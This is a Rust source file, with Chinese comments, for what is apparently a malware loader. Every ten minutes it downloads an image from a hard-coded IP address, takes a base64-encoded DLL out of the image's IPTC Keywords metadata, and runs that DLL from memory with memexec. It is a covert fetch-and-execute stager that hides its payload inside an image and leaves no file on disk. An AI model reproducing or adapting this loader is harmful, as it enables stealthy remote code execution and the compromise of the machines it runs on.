use std::{fs::File, io::Write};
use std::thread;
use std::time::Duration;
use memexec::peloader::def::DLL_PROCESS_ATTACH;
// use rexiv2::Metadata;

use reqwest::{blocking::Client};

fn main() {
    // 创建 HTTP 客户端
    let client = Client::new();
    let mut buf = vec![];
    loop {
        // 创建 GET 请求
        let request = client
            .get("http://173.82.58.11:8000/logo.jpg")
            .build().expect("fail");

        // 发送请求并获取响应
        let response: Result<reqwest::blocking::Response, reqwest::Error> = client.execute(request);
        // println!("{:?}",response);

        if let Ok(mut response) = response {
            // 读取响应体中的数据并将其写入文件
            // let mut file = File::create("logo.jpg").unwrap();
            // copy(&mut response, &mut file).unwrap();
            // println!("{:?}",response);
            response.copy_to(&mut buf).unwrap();
            read_meta(&buf);
            buf.clear();

        }
        
        // 暂停 10 分钟
        thread::sleep(Duration::from_secs(10 * 60));
    }
}

fn read_meta(response:&Vec<u8>) {
    // read
    println!("{:?}",&response);
    let meta = rexiv2::Metadata::new_from_buffer(&response).expect("error");
    let encode_dll = meta.get_tag_string("Iptc.Application2.Keywords").expect("read fail due to the file size is too much.....");
    // println!("{:?}", encode_dll);
    //解析出dll

    let dll = base64::decode(encode_dll).expect("decode fail");

    // let mut file = File::create("buffer.dll").expect("Failed to create file");
    // let mut offset = 0;
    // while offset < dll.len() {
    // let bytes_written = file.write(&dll[offset..]).expect("Failed to write to file");
    // offset += bytes_written;
    // }

    //内存加载dll
    unsafe {
        // DLL's entry point is DllMain
        memexec_dll(&dll, 0 as _, DLL_PROCESS_ATTACH, 0 as _).unwrap();
    }

}